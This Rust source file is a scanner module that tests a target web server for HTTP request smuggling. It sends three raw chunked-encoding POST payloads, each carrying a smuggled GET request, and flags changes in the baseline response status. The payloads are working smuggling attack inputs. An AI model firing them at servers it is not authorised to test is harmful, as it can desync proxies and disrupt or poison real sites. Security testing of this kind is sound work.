use crate::core::constants::HTTP_USER_AGENT;
use crate::scanner::task::Task;
use async_trait::async_trait;
use riphttplib::types::{ClientTimeouts, ProtocolError, Request};
use riphttplib::{H1, Protocol, parse_target};
use std::time::Duration;

const CONNECT_TIMEOUT: Duration = Duration::from_secs(3);
const IO_TIMEOUT: Duration = Duration::from_secs(10);

#[derive(Clone, Copy, Default)]
pub struct TrailSmugTask;

impl TrailSmugTask {
    pub fn new() -> Self {
        Self
    }

    fn build_baseline_request(
        target: &str,
        timeouts: &ClientTimeouts,
    ) -> Result<Request, ProtocolError> {
        Ok(Request::new(target, "GET")?
            .header(&format!("user-agent: {}", HTTP_USER_AGENT))
            .timeout(timeouts.clone())
            .follow_redirects(false))
    }

    fn build_attack_requests(target: &str) -> Result<Vec<String>, ProtocolError> {
        let target = parse_target(target)?;
        let mut payloads = Vec::with_capacity(3);

        let path = target.path();
        let authority = target.authority().unwrap_or("localhost".to_string());

        payloads.push(format!(
            "\
            POST {path} HTTP/1.1\r\n\
            Host: {authority}\r\n\
            User-Agent: {HTTP_USER_AGENT}\r\n\
            Transfer-Encoding: chunked\r\n\
            \r\n\
            2\r\n\
            aa\r\n\
            0\r\n\
            any: value\r\n\
            GET /hopefully404?: HTTP/1.1\r\n\
            User-Agent: {HTTP_USER_AGENT}\r\n\
            Host: {authority}\r\n\
            \r\n"
        ));

        payloads.push(format!(
            "\
            POST {path} HTTP/1.1\r\n\
            Host: {authority}\r\n\
            User-Agent: {HTTP_USER_AGENT}\r\n\
            Transfer-Encoding: chunked\r\n\
            \r\n\
            2\r\n\
            aa\r\n\
            0\r\n\
            a\r\n\
            GET /hopefully404?: HTTP/1.1\r\n\
            User-Agent: {HTTP_USER_AGENT}\r\n\
            Host: {authority}\r\n\
            \r\n"
        ));

        let smug = format!(
            "\
            GET /hopefully404 HTTP/1.1\r\n\
            Host: {authority}\r\n\
            User-Agent: {HTTP_USER_AGENT}\r\n\
            \r\n"
        );
        let len = smug.len();

        payloads.push(format!(
            "\
            POST {path} HTTP/1.1\r\n\
            Host: {authority}\r\n\
            Connection: keep-alive\r\n\
            User-Agent: {HTTP_USER_AGENT}
            Transfer-Encoding: chunked\r\n\
            \r\n\
            0\r\n\
            any: value\r\n\
            a\r\n\
            \r\n\
            POST {path} HTTP/1.1\r\n\
            Host: {authority}\r\n\
            Connection: keep-alive\r\n\
            User-Agent: {HTTP_USER_AGENT}
            Content-Length: {len}\r\n\
            \r\n\
            {smug}"
        ));

        Ok(payloads)
    }
}

#[async_trait(?Send)]
impl Task for TrailSmugTask {
    type Error = ProtocolError;

    async fn execute(&self, target: String) -> Result<String, Self::Error> {
        let timeouts = ClientTimeouts {
            connect: Some(CONNECT_TIMEOUT),
            read: Some(IO_TIMEOUT),
            write: Some(IO_TIMEOUT),
        };

        let client = H1::timeouts(timeouts.clone());

        let mut findings = Vec::new();
        let attacks = match Self::build_attack_requests(&target) {
            Ok(val) => val,
            Err(_) => return Ok("".to_string()),
        };

        // Send baseline request first. skip attacks if it already fails
        let baseline_res = match client
            .send_request(Self::build_baseline_request(&target, &timeouts)?)
            .await
        {
            Ok(response) => response,
            Err(_) => {
                return Ok(String::new());
            }
        };

        if [301, 302, 404, 429, 502, 503].contains(&baseline_res.status) {
            return Ok("".to_string());
        }

        for req in attacks {
            // send attack
            client.send_raw(&target, req.into()).await?;
            // send base and check if there's a difference
            match client
                .send_request(Self::build_baseline_request(&target, &timeouts)?)
                .await
            {
                Ok(res) => {
                    if res.status != baseline_res.status {
                        if res.status == 404 {
                            findings.push(format!(
                                "[!] {} 404 resp difference: baseline {} curr {}",
                                target, baseline_res.status, res.status
                            ));
                        } else if res.status != 429 {
                            findings.push(format!(
                                "{} resp difference: baseline {} curr {}",
                                target, baseline_res.status, res.status
                            ));
                        }
                    }
                }
                Err(_) => {
                    return Ok(findings.join("\n"));
                }
            };
        }

        Ok(findings.join("\n"))
    }
}
